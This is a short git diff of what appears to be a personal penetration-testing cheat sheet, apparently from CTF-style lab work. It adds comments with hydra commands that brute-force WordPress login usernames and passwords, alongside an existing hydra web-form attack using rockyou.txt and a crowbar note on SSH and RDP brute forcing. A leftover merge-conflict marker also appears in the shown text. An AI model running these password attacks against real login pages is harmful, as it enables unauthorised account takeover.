@@ -302,7 +302,10 @@ wc # word count
 =======
         hydra -l Otis -P rockyou.txt 172.16.33.55 http-form-post "/monitoring/login.php:username=^USER^:passwd=^PASS^:INVALID LOGIN"  -vV -f
 >>>>>>> 1dbb00a0c70dafb0aa36fb8217493418e26c3746
-    
+
+	//for bruteforce username:  hydra -L username -p test 192.168.56.156 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 40 -v
+	//for passwd: hydra -l elliot -P username 192.168.56.156 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 40 -v
+	//the content of 'F=' only the response word, and user&pass
     crowbar
         ssh pub key brute, and win RDP psw brute
 
